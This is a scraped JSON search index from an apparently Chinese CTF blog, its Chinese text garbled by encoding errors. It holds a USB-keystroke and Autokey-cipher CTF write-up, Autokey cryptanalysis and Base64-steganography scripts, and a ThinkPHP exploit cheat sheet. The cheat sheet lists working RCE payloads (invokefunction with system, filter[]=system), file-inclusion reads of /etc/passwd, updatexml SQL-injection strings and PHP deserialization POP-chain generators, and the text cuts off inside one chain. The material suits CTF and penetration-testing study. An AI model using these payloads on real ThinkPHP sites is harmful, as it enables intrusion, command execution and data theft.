0x08:&quot;E&quot;, 0x09:&quot;F&quot;, 0x0A:&quot;G&quot;, 0x0B:&quot;H&quot;, 0x0C:&quot;I&quot;, 0x0D:&quot;J&quot;, 0x0E:&quot;K&quot;, 0x0F:&quot;L&quot;, 0x10:&quot;M&quot;, 0x11:&quot;N&quot;,0x12:&quot;O&quot;, 0x13:&quot;P&quot;, 0x14:&quot;Q&quot;, 0x15:&quot;R&quot;, 0x16:&quot;S&quot;, 0x17:&quot;T&quot;, 0x18:&quot;U&quot;,0x19:&quot;V&quot;, 0x1A:&quot;W&quot;, 0x1B:&quot;X&quot;, 0x1C:&quot;Y&quot;, 0x1D:&quot;Z&quot;, 0x1E:&quot;1&quot;, 0x1F:&quot;2&quot;, 0x20:&quot;3&quot;, 0x21:&quot;4&quot;, 0x22:&quot;5&quot;, 0x23:&quot;6&quot;, 0x24:&quot;7&quot;, 0x25:&quot;8&quot;, 0x26:&quot;9&quot;, 0x27:&quot;0&quot;, 0x28:&quot;n&quot;, 0x2a:&quot;[DEL]&quot;, 0X2B:&quot; &quot;, 0x2C:&quot; &quot;, 0x2D:&quot;-&quot;, 0x2E:&quot;=&quot;, 0x2F:&quot;[&quot;, 0x30:&quot;]&quot;, 0x31:&quot;\\\\&quot;, 0x32:&quot;~&quot;, 0x33:&quot;;&quot;, 0x34:&quot;&#x27;&quot;, 0x36:&quot;,&quot;, 0x37:&quot;.&quot; &#125;nums = []keys = open(&#x27;usbdata.txt&#x27;)for line in keys: if line[0]!=&#x27;0&#x27; or line[1]!=&#x27;0&#x27; or line[2]!=&#x27;0&#x27; or line[3]!=&#x27;0&#x27; or line[6]!=&#x27;0&#x27; or line[7]!=&#x27;0&#x27; or line[8]!=&#x27;0&#x27; or line[9]!=&#x27;0&#x27; or line[10]!=&#x27;0&#x27; or line[11]!=&#x27;0&#x27; or line[12]!=&#x27;0&#x27; or line[13]!=&#x27;0&#x27; or line[14]!=&#x27;0&#x27; or line[15]!=&#x27;0&#x27;: continue nums.append(int(line[4:6],16)) # 00:00:xx:....keys.close()output = &quot;&quot;for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += &#x27;[unknown]&#x27;print(&#x27;output :n&#x27; + output) ç»“æœï¼š output :n[unknown][unknown][DEL][DEL][DEL][DEL]nnn[unknown]UTO KEY[DEL][DEL][DEL][DEL]KEY YLLTMFTNXBKGVCYYDBUHDLCPSPSPS[DEL]TSWRMWJJMNJGTYLKEGITTOIBGO[DEL]O GOOD LUCK çŒœæµ‹ä¸ºAutokeyåŠ å¯†ï¼Œå¯†æ–‡ï¼šYLLTMFTNXBKGVCYYDBUHDLCPSPSPTSWRMWJJMNJGTYLKEGITTOIBGOã€‚ ä¿®æ”¹è„šæœ¬çˆ†ç ´ï¼Œç»“æœï¼š -359.75078413 autokey, klen 3 :&quot;KGT&quot;, OFSFHNOGKNEWIYCQFZECEHALLPHEELSNBEWIIRBYCXNIHTAMAOWBSS-324.335522444 autokey, klen 4 :&quot;GHAT&quot;, SELAUBINDACTSCWFLZYCSMENADOCTPIPTHBUTGIMASDYEOFVPADGRO-323.532048185 autokey, klen 5 :&quot;XRAEF&quot;, BULPHEZCIUGHTUESWIADLPUPPEDVEDSORSGRYWRACAPTEEIEAKETCO-327.336020209 autokey, klen 6 :&quot;WGUMES&quot;, CFRHINRIGUCTEUSEBIQNLHBHCCHISLUPFORYSYESCATMAOGTACINAV-306.901215421 autokey, klen 7 :&quot;QSLAYRJ&quot;, ITATOOKFEBRSHSTUCKCALSININSEBKJJZEFICEAHPTDIAGBEALABAN-297.048582118 autokey, klen 8 :&quot;UISMBHTT&quot;, EDTHLYAUTYRZKEYEKDDITHELIMPHALSGEKUCMCRAPORISERTEARTOK-255.780042935 autokey, klen 9 :&quot;KEYFORZIP&quot;, OHNOYOUFINDTHEKEYTHEKEYFORZIPISTHISKEYBOARDSUCKSFORYOU å¾—åˆ°è§£å‹å¯†ç thiskeyboardsuckforyouï¼Œå¾—åˆ°flag.txtã€‚ æ‰“å¼€å‘ç°å¤šè¡ŒBase64ç¼–ç å¯†æ–‡ï¼Œè§£ç å¾—åˆ°16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¼€å¤´89504E47ä¸ºpngæ–‡ä»¶å¤´ï¼Œè¿˜åŸå¾—åˆ°çš„pngå›¾ç‰‡æ— ä¿¡æ¯ã€‚ çŒœæµ‹ä¸ºBase64éšå†™ï¼Œå°è¯•è·‘è§£å¯†è„šæœ¬ï¼Œå¾—åˆ°flag~","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2020èµ›","slug":"2020èµ›","permalink":"https://lazzzaro.github.io/tags/2020%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"è‡ªåŠ¨å¯†é’¥å¯†ç ","slug":"crypto-è‡ªåŠ¨å¯†é’¥å¯†ç ","date":"2020-06-14T07:32:12.000Z","updated":"2020-09-19T08:05:30.597Z","comments":true,"path":"2020/06/14/crypto-è‡ªåŠ¨å¯†é’¥å¯†ç /","permalink":"https://lazzzaro.github.io/2020/06/14/crypto-%E8%87%AA%E5%8A%A8%E5%AF%86%E9%92%A5%E5%AF%86%E7%A0%81/","excerpt":"","text":"è‡ªåŠ¨å¯†é’¥å¯†ç ï¼ˆAutokeyå¯†ç /Autokey Cipherï¼‰è‡ªåŠ¨å¯†é’¥å¯†ç æ˜¯å¯†ç å­¦ä¸­çš„ä¸€ç§åŠ å¯†ç®—æ³•ï¼Œä¸ç»´å‰å°¼äºšå¯†ç ç±»ä¼¼ï¼ŒåŒºåˆ«åœ¨äºå¯†é’¥ä¸åŒã€‚å®ƒçš„å¯†é’¥å¼€å¤´æ˜¯ä¸€ä¸ªå…³é”®è¯ï¼Œä¹‹ååˆ™æ˜¯æ˜æ–‡çš„é‡å¤ã€‚ ç¤ºä¾‹ ä¸‹é¢æ¼”ç¤ºçš„æ˜¯ä¸€ç§è‡ªåŠ¨å¯†é’¥å¯†ç çš„åŠ å¯†æ–¹æ³•ã€‚å…ˆå‡è®¾å…³é”®è¯ä¸ºQUEENLYï¼Œè€Œæ–‡æœ¬ä¿¡æ¯ä¸ºATTACK AT DAWNï¼Œåˆ™è‡ªåŠ¨ç”Ÿæˆçš„å¯†é’¥ä¸ºâ€QUEENLYATTACKATDAWNâ€ã€‚ä¹‹åå†é€šè¿‡ç»´å‰å°¼äºšå¯†ç çš„è¡¨æ ¼æ³•ç”Ÿæˆå¯†æ–‡ï¼š 123æ˜æ–‡ï¼šATTACK AT DAWN...å¯†é’¥ï¼šQUEENL YA TTACK AT DAWN....å¯†æ–‡ï¼šQNXEPV YT WTWP... ç ´è¯‘æ–¹æ³• å‡è®¾æ˜æ–‡ä¸ºMEET AT THE FOUNTAINï¼Œå…³é”®è¯ä¸ºKILTï¼š 123æ˜æ–‡ï¼šMEETATTHEFOUNTAINï¼ˆæœªçŸ¥ï¼‰å¯†é’¥ï¼šKILTMEETATTHEFOUNï¼ˆæœªçŸ¥ï¼‰å¯†æ–‡ï¼šWMPMMXXAEYHBRYOCAï¼ˆå·²çŸ¥ï¼‰ æˆ‘ä»¬å°è¯•ä¸€äº›å¸¸ç”¨å•è¯ã€åŒå­—æ¯ç»„ã€ä¸‰å­—æ¯ç»„ç­‰åœ¨å¯†é’¥ä¸­çš„å¯èƒ½ä½ç½®ï¼Œå¦‚THEï¼š 1234567891011å¯†æ–‡ï¼šWMP MMX XAE YHB RYO CAå¯†é’¥ï¼šTHE THE THE THE THE ..æ˜æ–‡ï¼šDFL TFT ETA FAX YRK ..å¯†æ–‡ï¼šW MPM MXX AEY HBR YOC Aå¯†é’¥ï¼š. THE THE THE THE THE .æ˜æ–‡ï¼š. TII TQT HXU OUN FHY .å¯†æ–‡ï¼šWM PMM XXA EYH BRY OCAå¯†é’¥ï¼š.. THE THE THE THE THEæ˜æ–‡ï¼š.. WFI EQW LRD IKU VVW æˆ‘ä»¬å°†è¿™äº›æ˜æ–‡ç‰‡æ®µæŒ‰å‡ºç°çš„å¯èƒ½æ€§æ’åˆ—ï¼š 12ä¸å¯èƒ½ &lt;--------------------------&gt;æœ€å¯èƒ½EQW DFL TFT ... ... ... ... ETA OUN FAX ç”±äºæ­£ç¡®çš„æ˜æ–‡ç‰‡æ®µåŒæ ·ä¹Ÿä¼šå‡ºç°åœ¨å¯†é’¥ä¸­ï¼Œå› æ­¤å¯ä»¥å°†å…¶åç§»å…³é”®è¯çš„é•¿åº¦è€Œå¾—åˆ°å¯†é’¥ç‰‡æ®µã€‚åŒæ ·åœ°ï¼Œæˆ‘ä»¬çŒœæµ‹çš„å¯†é’¥ç‰‡æ®µTHEä¹Ÿä¼šå‡ºç°åœ¨æ˜æ–‡ä¸­ã€‚å› æ­¤ï¼ŒçŒœæµ‹å…³é”®è¯çš„é•¿åº¦ï¼ˆè­¬å¦‚è¯´3åˆ°12ä¹‹é—´ï¼‰ï¼Œæˆ‘ä»¬å°±èƒ½å¾—åˆ°æ˜æ–‡å’Œå¯†é’¥ã€‚ å°è¯•OUNå¯èƒ½å¾—åˆ°ï¼š 1234567891011121314åç§»4ä½ï¼šå¯†æ–‡ï¼šWMPMMXXAEYHBRYOCAå¯†é’¥ï¼š......ETA.THE.OUNæ˜æ–‡ï¼š......THE.OUN.AINåç§»5ä½ï¼šå¯†æ–‡ï¼šWMPMMXXAEYHBRYOCAå¯†é’¥ï¼š.....EQW..THE..OUæ˜æ–‡ï¼š.....THE..OUN..OGåç§»6ä½ï¼šå¯†æ–‡ï¼šWMPMMXXAEYHBRYOCAå¯†é’¥ï¼š....TQT...THE...Oæ˜æ–‡ï¼š....THE...OUN...M çœ‹èµ·æ¥åç§»é‡ä¸º4æ—¶çš„å¯èƒ½æ€§æœ€å¤§ï¼ˆå…¶ä»–çš„éƒ½å«æœ‰ä¸å¤ªå¯èƒ½å‡ºç°çš„Qï¼‰ï¼Œå› æ­¤æˆ‘ä»¬å†å°†æ–°å¾—åˆ°çš„ETAåç§»4ä½ï¼š 123å¯†æ–‡ï¼šWMPMMXXAEYHBRYOCAå¯†é’¥ï¼š..LTM.ETA.THE.OUNæ˜æ–‡ï¼š..ETA.THE.OUN.AIN æˆ‘ä»¬çŸ¥é“äº†å…³é”®è¯çš„é•¿åº¦å¾ˆå¯èƒ½æ˜¯4ä½ï¼ˆä»¥LTç»“å°¾ï¼‰ï¼Œä¸”å·²æœ‰äº†æ–‡æœ¬çš„ä¸€éƒ¨åˆ†ï¼š 1..ETA.THE.OUN.AIN ä¹‹åä»¥æ­¤ä¸ºä¾æ®å†è¿›è¡Œä¸€äº›çŒœæµ‹ï¼Œå¯ä»¥éªŒè¯å¦‚ä¸‹æ˜¯çœŸæ­£çš„æ˜æ–‡ï¼š 1MEETATTHEFOUNTAIN è„šæœ¬ å‚è€ƒï¼šhttp://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/ ç›¸å…³æ¨¡å—åŠæ–‡ä»¶ï¼š quadgrams.txtï¼šhttp://www.practicalcryptography.com/media/cryptanalysis/files/quadgrams.txt trigrams.txtï¼šhttp://www.practicalcryptography.com/media/cryptanalysis/files/trigrams.txt ngram_scoreï¼šhttp://www.practicalcryptography.com/media/cryptanalysis/files/ngram_score_1.py 123456789101112131415161718192021222324252627282930### ngram_score.py ###&#x27;&#x27;&#x27;Allows scoring of text using n-gram probabilities17/07/12&#x27;&#x27;&#x27;from math import log10class ngram_score(object): def __init__(self,ngramfile,sep=&#x27; &#x27;): &#x27;&#x27;&#x27; load a file containing ngrams and counts, calculate log probabilities &#x27;&#x27;&#x27; self.ngrams = &#123;&#125; for line in open(ngramfile): key,count = line.split(sep) self.ngrams[key] = int(count) self.L = len(key) self.N = sum(self.ngrams.values()) #calculate log probabilities for key in self.ngrams.keys(): self.ngrams[key] = log10(float(self.ngrams[key])/self.N) self.floor = log10(0.01/self.N) def score(self,text): &#x27;&#x27;&#x27; compute the score of text &#x27;&#x27;&#x27; score = 0 ngrams = self.ngrams.__getitem__ for i in range(len(text)-self.L+1): if text[i:i+self.L] in self.ngrams: score += ngrams(text[i:i+self.L]) else: score += self.floor return score æ ¸å¿ƒè„šæœ¬ï¼ˆpython3ï¼‰ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465### break_autokey.py ###from ngram_score import ngram_scorefrom pycipher import Autokeyimport refrom itertools import permutationsqgram = ngram_score(&#x27;quadgrams.txt&#x27;)trigram = ngram_score(&#x27;trigrams.txt&#x27;)ctext = &#x27;isjiqymdebvuzrvwhmvysibugzhyinmiyeiklcvioimbninyksmmnjmgalvimlhspjxmgfiraqlhjcpvolqmnyynhpdetoxemgnoxl&#x27;ctext = re.sub(r&#x27;[^A-Z]&#x27;,&#x27;&#x27;,ctext.upper())# keep a list of the N best things we have seen, discard anything elseclass nbest(object): def __init__(self,N=1000): self.store = [] self.N = N def add(self,item): self.store.append(item) self.store.sort(reverse=True) self.store = self.store[:self.N] def __getitem__(self,k): return self.store[k] def __len__(self): return len(self.store)#initN=100for KLEN in range(3,20): rec = nbest(N) for i in permutations(&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;,3): key = &#x27;&#x27;.join(i) + &#x27;A&#x27;*(KLEN-len(i)) pt = Autokey(key).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += trigram.score(pt[j:j+3]) rec.add((score,&#x27;&#x27;.join(i),pt[:30])) next_rec = nbest(N) for i in range(0,KLEN-3): for k in range(N): for c in &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;: key = rec[k][1] + c fullkey = key + &#x27;A&#x27;*(KLEN-len(key)) pt = Autokey(fullkey).decipher(ctext) score = 0 for j in range(0,len(ctext),KLEN): score += qgram.score(pt[j:j+len(key)]) next_rec.add((score,key,pt[:30])) rec = next_rec next_rec = nbest(N) bestkey = rec[0][1] pt = Autokey(bestkey).decipher(ctext) bestscore = qgram.score(pt) for i in range(N): pt = Autokey(rec[i][1]).decipher(ctext) score = qgram.score(pt) if score &gt; bestscore: bestkey = rec[i][1] bestscore = score print(bestscore,&#x27;autokey, klen&#x27;,KLEN,&#x27;:&quot;&#x27;+bestkey+&#x27;&quot;,&#x27;,Autokey(bestkey).decipher(ctext))","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"å¯†ç ","slug":"å¯†ç ","permalink":"https://lazzzaro.github.io/tags/%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"Base64éšå†™","slug":"misc-Base64éšå†™","date":"2020-06-14T04:00:48.000Z","updated":"2020-06-14T04:47:19.248Z","comments":true,"path":"2020/06/14/misc-Base64éšå†™/","permalink":"https://lazzzaro.github.io/2020/06/14/misc-Base64%E9%9A%90%E5%86%99/","excerpt":"","text":"åŸç†Base64çš„ç¼–ç è¿‡ç¨‹å°±æ˜¯å°†æ–‡æœ¬å­—ç¬¦å¯¹åº”æˆäºŒè¿›åˆ¶åï¼Œå†å…­ä¸ªä¸€ç»„å¯¹åº”æˆç´¢å¼•ï¼Œè½¬ä¸ºç¼–ç å­—ç¬¦ã€‚å¦‚æœå­—ç¬¦ä¸²é•¿åº¦ä¸æ˜¯3çš„ å€æ•°ï¼Œåˆ™å¯¹åº”çš„äºŒè¿›åˆ¶ä½æ•°ä¸æ˜¯6çš„å€æ•°ï¼Œéœ€è¦åœ¨æœ«å°¾ç”¨0å¡«å……ã€‚è‹¥å‰©1ä¸ªå­—ç¬¦åˆ™åœ¨ç¼–ç ç»“æœååŠ 2ä¸ªâ€˜=â€™ï¼›è‹¥å‰©2ä¸ªå­—ç¬¦åˆ™ åŠ 1ä¸ªâ€˜=â€™ã€‚ Base64çš„è§£ç è¿‡ç¨‹ï¼Œå³å…ˆä¸¢å¼ƒç¼–ç åé¢çš„â€˜=â€™ï¼Œç„¶åå°†æ¯ä¸ªbase64å­—ç¬¦å¯¹åº”ç´¢å¼•è½¬ä¸º6bitçš„äºŒè¿›åˆ¶æ•°ï¼Œå†8ä¸ªä¸€ç»„è½¬ä¸ºASCIIç å­—ç¬¦å®Œæˆè§£ç ï¼Œæœ€åè‹¥å‰©ä¸‹ä¸è¶³8ä½çš„ï¼Œåˆ™å…¨éƒ¨ä¸¢å¼ƒã€‚ æ‰€ä»¥æŸäº›bitä½åœ¨è§£ç æ—¶ä¼šè¢«ä¸¢å¼ƒï¼Œæ¢å¥è¯è¯´ï¼Œè¿™äº›bitå€¼ä¸ä¼šå¯¹è§£ç ç»“æœäº§ç”Ÿå½±å“ã€‚ä¸€ä¸ªç®€å•ç›´è§‚çš„ä¾‹å­å°±æ˜¯QUJDRAå’ŒQUJDRCè§£ç åéƒ½æ˜¯ABCDã€‚ç”±æ­¤æˆ‘ä»¬ä¾¿å¯ä»¥å°†éšè—ä¿¡æ¯æ’å…¥è¿™äº›bitä½ä¸­å®ç°éšå†™ã€‚ ä¸€ä¸²Base64çš„ç¼–ç æœ€å¤šä¹Ÿåªæœ‰4bitçš„éšå†™ç©ºé—´ï¼Œæ‰€ä»¥å®ç°éšå†™å¾€å¾€éœ€è¦å¤§é‡ç¼–ç ä¸²ã€‚éšå†™æ—¶æŠŠæ˜æ–‡çš„æ¯ä¸ªå­—ç¬¦ç”¨8ä½äºŒè¿›åˆ¶æ•°è¡¨ç¤ºï¼Œç”±æ­¤å°†æ•´ä¸ªæ˜æ–‡ä¸²è½¬ä¸ºbitä¸²ï¼ŒæŒ‰é¡ºåºå¡«å…¥Base64ç¼–ç ä¸²çš„å¯éšå†™ä½ä¸­å³å¯å®ç°éšå†™ã€‚ åŠ å¯†123456789101112131415# -*- coding: utf-8 -*-import base64flag = &#x27;flag&#123;Base64isF4n&#125;&#x27; #flagbin_str = &#x27;&#x27;.join([bin(ord(c)).replace(&#x27;0b&#x27;, &#x27;&#x27;).zfill(8) for c in flag])base64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;0.txt&#x27;, &#x27;rb&#x27;) as f0, open(&#x27;1.txt&#x27;, &#x27;wb&#x27;) as f1: #&#x27;0.txt&#x27;æ˜¯æ˜æ–‡, &#x27;1.txt&#x27;ç”¨äºå­˜æ”¾éšå†™åçš„ base64 for line in f0.readlines(): rowstr = base64.b64encode(line.replace(&#x27;\\n&#x27;, &#x27;&#x27;)) equalnum = rowstr.count(&#x27;=&#x27;) if equalnum and len(bin_str): offset = int(&#x27;0b&#x27;+bin_str[:equalnum * 2], 2) char = rowstr[len(rowstr) - equalnum - 1] rowstr = rowstr.replace(char, base64chars[base64chars.index(char) + offset]) bin_str = bin_str[equalnum*2:] f1.write(rowstr + &#x27;\\n&#x27;) è§£å¯†123456789101112# -*- coding: utf-8 -*-b64chars = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;with open(&#x27;1.txt&#x27;, &#x27;rb&#x27;) as f: bin_str = &#x27;&#x27; for line in f.readlines(): stegb64 = &#x27;&#x27;.join(line.split()) rowb64 = &#x27;&#x27;.join(stegb64.decode(&#x27;base64&#x27;).encode(&#x27;base64&#x27;).split()) offset = abs(b64chars.index(stegb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])-b64chars.index(rowb64.replace(&#x27;=&#x27;,&#x27;&#x27;)[-1])) equalnum = stegb64.count(&#x27;=&#x27;) #no equalnum no offset if equalnum: bin_str += bin(offset)[2:].zfill(equalnum * 2) print(&#x27;&#x27;.join([chr(int(bin_str[i:i + 8], 2)) for i in xrange(0, len(bin_str), 8)])) #8 ä½ä¸€ç»„","categories":[{"name":"misc","slug":"misc","permalink":"https://lazzzaro.github.io/categories/misc/"}],"tags":[{"name":"éšå†™","slug":"éšå†™","permalink":"https://lazzzaro.github.io/tags/%E9%9A%90%E5%86%99/"}],"author":"Lazzaro"},{"title":"CMS","slug":"web-CMS","date":"2020-05-24T12:24:48.000Z","updated":"2023-10-31T18:03:34.552Z","comments":true,"path":"2020/05/24/web-CMS/","permalink":"https://lazzzaro.github.io/2020/05/24/web-CMS/","excerpt":"","text":"â€‹ ç½‘ç«™è¯†åˆ«ï¼šhttps://www.wappalyzer.com/ Exploit Database: https://www.exploit-db.com/ PHPGGC: https://github.com/ambionics/phpggc å¯¹æ¯”æºç ï¼šdiff -r DirA DirB â€‹ ThinkPHP ç‰ˆæœ¬ å…³é”®å­—ï¼šTHINK_VERSION æ—¥å¿— é»˜è®¤å½¢å¼ï¼šå¦‚ /202110/11.logï¼ˆ/å¹´æœˆ/æ—¥.logï¼‰ æ§åˆ¶å™¨ é©¼å³°å‘½åæ³•æ§åˆ¶å™¨å¦‚ M1sakaM1yuuï¼Œåœ¨ThinkPHPå®˜æ–¹æ–‡æ¡£ä¸­ï¼Œè®¿é—®çš„æ­£ç¡®æ–¹å¼åº”è¯¥æ˜¯index/m1saka_m1yuu/indexï¼Œä¸­é—´ä½¿ç”¨ä¸‹åˆ’çº¿éš”å¼€ï¼Œä½†æ˜¯å…¼å®¹äº†index/M1sakaM1yuu/indexè¿™æ ·çš„è®¿é—®æ–¹å¼ï¼Œæ–°å®˜æ–¹è¡¥ä¸ä¿®å¤åï¼Œä¸å…è®¸è·¯ç”±ä¸­å­˜åœ¨å¤§å†™å­—æ¯ã€‚ å·¥å…· Lucifer1993/TPscan theLSA/tp5-getshell sukabuliet/ThinkphpRCE bewhale/thinkphp_gui_tools 2.x 2.x RCE index.php?s=/index/index/name/$&#123;phpinfo()&#125; 3.2.x æ—¥å¿—ï¼š&lt;domain&gt;/Application/Runtime/Logs/Home/21_04_27.log é€šç”¨ SQLæ³¨å…¥+æ–‡ä»¶è¯»å–+ååºåˆ—åŒ– ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾ RCE / LFI ThinkPHP3.2.x RCEæ¼æ´é€šæŠ¥ å¦‚æœæ¨¡æ¿èµ‹å€¼æ–¹æ³•assignçš„ç¬¬ä¸€ä¸ªå‚æ•°å¯æ§ï¼Œåˆ™å¯å¯¼è‡´æ¨¡æ¿æ–‡ä»¶è·¯å¾„å˜é‡è¢«è¦†ç›–ä¸ºæºå¸¦æ”»å‡»ä»£ç çš„æ–‡ä»¶è·¯å¾„ï¼Œé€ æˆä»»æ„æ–‡ä»¶åŒ…å«ï¼Œæ‰§è¡Œä»»æ„ä»£ç ã€‚ debugæ¨¡å¼å…³ index.php?m=--&gt;&lt;?=phpinfo();?&gt; LFIï¼š index.php?m=Home&amp;c=Index&amp;a=index&amp;value[filename]=./Application/Runtime/Logs/Home/21_06_30.log æˆ– index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_30.log debugæ¨¡å¼å¼€ index.php?m=Home&amp;c=Index&amp;a=index&amp;test=--&gt;&lt;?=phpinfo();?&gt; LFIï¼š index.php?m=Home&amp;c=Index&amp;a=index&amp;value[filename]=./Application/Runtime/Logs/Home/21_06_30.log æˆ– index.php?m=Home&amp;c=Index&amp;a=index&amp;value[_filename]=./Application/Runtime/Logs/Home/21_06_30.log é™å®šæ¡ä»¶ä¸‹å‚æ•°çš„æ”¶é›†ï¼ˆæ›¿æ¢å˜é‡åï¼‰ param/name/value/array/arr/info/list/page/menus/var/data/moudle/module 3.2.3 SQLæ³¨å…¥ index.php?m=Home&amp;c=Index&amp;a=index2&amp;id[where]=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) %23 index.php?username[0]=exp&amp;username[1]==1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) %23 index.php?id[0]=bind&amp;id[1]=0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password=1 index.php?m=Home&amp;c=Index&amp;a=sqlvul2&amp;order[updatexml(1,concat(0x3a,user()),1)] å˜é‡è¦†ç›– empty($_content)?include $templateFile:eval(&#39;?&gt;&#39;.$_content); ååºåˆ—åŒ–+SQLæ³¨å…¥ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758&lt;?phpnamespace Think\\Image\\Driver;use Think\\Session\\Driver\\Memcache;class Imagick&#123; private $img; public function __construct()&#123; $this-&gt;img = new Memcache(); &#125;&#125;namespace Think\\Session\\Driver;use Think\\Model;class Memcache &#123; protected $handle; public function __construct()&#123; $this-&gt;sessionName=null; $this-&gt;handle= new Model(); &#125;&#125;namespace Think;use Think\\Db\\Driver\\Mysql;class Model&#123; protected $pk; protected $options; protected $data; protected $db; public function __construct()&#123; $this-&gt;options[&#x27;where&#x27;]=&#x27;&#x27;; $this-&gt;pk=&#x27;x&#x27;; $this-&gt;data[$this-&gt;pk]=array( &quot;table&quot;=&gt;&quot;mysql.user where 1=updatexml(1,concat(0x7e,user()),1)#&quot;, &quot;where&quot;=&gt;&quot;1=1&quot; ); $this-&gt;db=new Mysql(); &#125;&#125;namespace Think\\Db\\Driver;use PDO;class Mysql&#123; protected $options ; protected $config ; public function __construct()&#123; $this-&gt;options= array(PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true ); // å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶ $this-&gt;config= array( &quot;debug&quot; =&gt; 1, &quot;database&quot; =&gt; &quot;mysql&quot;, &quot;hostname&quot; =&gt; &quot;127.0.0.1&quot;, &quot;hostport&quot; =&gt; &quot;3306&quot;, &quot;charset&quot; =&gt; &quot;utf8&quot;, &quot;username&quot; =&gt; &quot;root&quot;, &quot;password&quot; =&gt; &quot;root&quot; ); &#125;&#125;use Think\\Image\\Driver\\Imagick;echo base64_encode(serialize(new Imagick())); 5.0.x é€šç”¨ æ–‡ä»¶åŒ…å« Thinkphp å¤šè¯­è¨€åŠŸèƒ½å¯¼è‡´çš„ä»»æ„æ–‡ä»¶åŒ…å« ?lang=../../../../../public/index http://tttang.com/archive/1865/ 5.0.7&lt;=ver&lt;=5.0.22 æœªå¼€å¯å¼ºåˆ¶è·¯ç”±RCE ?s=index/think\\config/get&amp;name=database.username ?s=index/think\\config/get&amp;name=database.password ?s=index/\\think\\Lang/load&amp;file=../../test.jpg ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami ?s=index POST: _method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;get[]=phpinfo ?s=index POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami &lt;5.0.23 ThinkPHP 5.0.0~5.0.23 Requestç±»ä»»æ„æ–¹æ³•è°ƒç”¨å¯¼è‡´RCEæ¼æ´åˆ†æ RCE index.php?s=/index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=php%20-r%20&#39;phpinfo();&#39; index.php?s=captcha POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami index.php?s=index/index POST: _method=__construct&amp;filter[]=system&amp;method=GET&amp;get[]=whoami ä»»æ„æ–‡ä»¶åŒ…å« index.php?s=captcha POST: _method=__construct&amp;method=GET&amp;filter[]=think__include_file&amp;server[]=1&amp;get[]=/etc/passwd &lt;5.0.12 RCE index.php?s=index/index POST: _method=__construct&amp;filter[]=system&amp;method=POST&amp;s=whoami 5.0.21-5.0.23 RCE index.php?s=captcha POST: _method=__construct&amp;filter[]=system&amp;method=get&amp;server[REQUEST_METHOD]=whoami 5.0.24 ååºåˆ—åŒ– ThinkPHP v5.0.x ååºåˆ—åŒ–åˆ©ç”¨é“¾æŒ–æ˜ ç”Ÿæˆpharï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125&lt;?phpnamespace think\\process\\pipes &#123; class Windows &#123; private $files = []; public function __construct($files) &#123; $this-&gt;files = [$files]; &#125; &#125;&#125;namespace think &#123; abstract class Model&#123; protected $append = []; protected $error = null; public $parent; function __construct($output, $modelRelation) &#123; $this-&gt;parent = $output; $this-&gt;append = array(&quot;xxx&quot;=&gt;&quot;getError&quot;); $this-&gt;error = $modelRelation; &#125; &#125;&#125;namespace think\\model&#123; use think\\Model; class Pivot extends Model&#123; function __construct($output, $modelRelation) &#123; parent::__construct($output, $modelRelation); &#125; &#125;&#125;namespace think\\model\\relation&#123; class HasOne extends OneToOne &#123; &#125;&#125;namespace think\\model\\relation &#123; abstract class OneToOne &#123; protected $selfRelation; protected $bindAttr = []; protected $query; function __construct($query) &#123; $this-&gt;selfRelation = 0; $this-&gt;query = $query; //$queryæŒ‡å‘Query $this-&gt;bindAttr = [&#x27;xxx&#x27;];// $valueå€¼ï¼Œä½œä¸ºcallå‡½æ•°å¼•ç”¨çš„ç¬¬äºŒå˜é‡ &#125; &#125;&#125;namespace think\\db &#123; class Query &#123; protected $model; function __construct($model) &#123; $this-&gt;model = $model; //$this-&gt;model=&gt; think\\console\\Output; &#125; &#125;&#125;namespace think\\console&#123; class Output&#123; private $handle; protected $styles; function __construct($handle) &#123; $this-&gt;styles = [&#x27;getAttr&#x27;]; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver &#123; class Memcached &#123; protected $handler; function __construct($handle) &#123; $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver &#123; class File &#123; protected $options=null; protected $tag; function __construct()&#123; $this-&gt;options=[ &#x27;expire&#x27; =&gt; 3600, &#x27;cache_subdir&#x27; =&gt; false, &#x27;prefix&#x27; =&gt; &#x27;&#x27;, &#x27;path&#x27; 